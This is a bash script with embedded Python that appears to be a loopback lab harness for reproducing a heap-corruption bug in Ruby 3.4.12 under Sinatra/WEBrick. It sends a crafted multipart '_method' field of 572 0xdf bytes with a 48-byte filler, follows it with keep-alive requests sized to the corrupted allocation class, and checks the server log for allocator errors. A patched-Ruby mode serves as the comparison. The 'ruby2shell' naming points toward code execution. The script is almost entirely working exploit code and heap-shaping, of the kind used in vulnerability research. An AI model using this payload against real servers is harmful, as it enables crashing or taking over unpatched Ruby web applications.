#!/bin/bash
# WEBrick N=572 survivor + SAME-CONNECTION follow-up requests.
#
# The N=572 filler-48 geometry survives worker-thread teardown abort in stock
# Sinatra/WEBrick. WEBrick serves keep-alive requests on the SAME worker
# thread, holding its glibc arena alive across follow-up allocations in the
# corrupted size class. Loopback only; no middleware, debugger write or
# memory oracle in the request path.
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-attack}"
TAG="${2:-webrick-keepalive-$MODE}"
case "$MODE" in
  fixed) RB=lab/build/plain/ruby-3.4.13-plain/bin/ruby ;;
  *)     RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby ;;
esac
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
EV=lab/build/evidence
OUT="$EV/stock-baseline-$TAG.out"
LOG="$EV/stock-baseline-$TAG.server.log"
PORT=4551
export RUBY2SHELL_STOCK_PORT="$PORT"
export RUBY2SHELL_KEEP_FILL="${RUBY2SHELL_KEEP_FILL:-48}"
mkdir -p "$EV"
"$RB" lab/repro/ruby2shell-stock-baseline.ru -s webrick > "$LOG" 2>&1 &
PID=$!
READY=NO
for _ in $(seq 1 300); do
  if curl -s -m 1 "http://127.0.0.1:$PORT/" >/dev/null 2>&1; then READY=YES; break; fi
  sleep 0.1
done
python3 - "$MODE" "$RUBY2SHELL_KEEP_FILL" > "$OUT" 2>&1 <<'PY'
import socket, sys
mode, fill = sys.argv[1], int(sys.argv[2])
n = 572
data = b'\xdf' * n if mode == 'control' else b'a' + b'\xdf' * (n - 1)
method = (b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
          b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n' + data)
body = (b'--XB\r\nContent-Disposition: form-data; name="f"\r\n'
        b'Content-Type: text/plain\r\n\r\n' + (b'f' * fill) + b'\r\n' + method +
        b'\r\n--XB--\r\n')

def request(sock, line, body=b'', extra=b''):
    head = line + b'\r\nHost: 127.0.0.1\r\nConnection: keep-alive\r\n' + extra
    if body:
        head += b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
    sock.sendall(head + b'\r\n' + body)
    buf = b''
    while b'\r\n\r\n' not in buf:
        part = sock.recv(65536)
        if not part:
            return None, buf
        buf += part
    hdr, rest = buf.split(b'\r\n\r\n', 1)
    length = 0
    for h in hdr.split(b'\r\n'):
        if h.lower().startswith(b'content-length:'):
            length = int(h.split(b':', 1)[1].strip())
    while len(rest) < length:
        part = sock.recv(65536)
        if not part:
            break
        rest += part
    return int(hdr.split(b' ')[1]), rest[:length]

s = socket.create_connection(('127.0.0.1', 4551), timeout=20)
s.settimeout(20)
status, resp = request(s, b'POST /not-a-route HTTP/1.1', body,
                       b'Content-Type: multipart/form-data; boundary=XB\r\n')
print('request1 _method status=%s bytes=%s' % (status, len(resp or b'')))
plain = (b'--XB\r\nContent-Disposition: form-data; name="f"\r\n'
         b'Content-Type: text/plain\r\n\r\n' + (b'z' * 48) + b'\r\n--XB--\r\n')
status, resp = request(s, b'POST /not-a-route HTTP/1.1', plain,
                       b'Content-Type: multipart/form-data; boundary=XB\r\n')
print('request2 48-byte-part status=%s bytes=%s' % (status, len(resp or b'')))
status, resp = request(s, b'GET /?q=' + b'q' * 512 + b' HTTP/1.1')
print('request3 512-byte-query status=%s bytes=%s' % (status, len(resp or b'')))
s.close()
PY
sleep 1
if kill -0 "$PID" 2>/dev/null; then ALIVE=YES; else ALIVE=NO; fi
kill "$PID" 2>/dev/null
wait "$PID" 2>/dev/null
RC=$?
echo "== $TAG mode=$MODE ruby=$RB ready=$READY"
cat "$OUT"
echo "allocator-diagnostic: $(grep -E 'corrupted|malloc\(\)|free\(\)|double free|invalid|Segmentation' "$LOG" 2>/dev/null | tr '\n' ';')"
echo "process-alive-after-keepalive=$ALIVE server-rc=$RC"
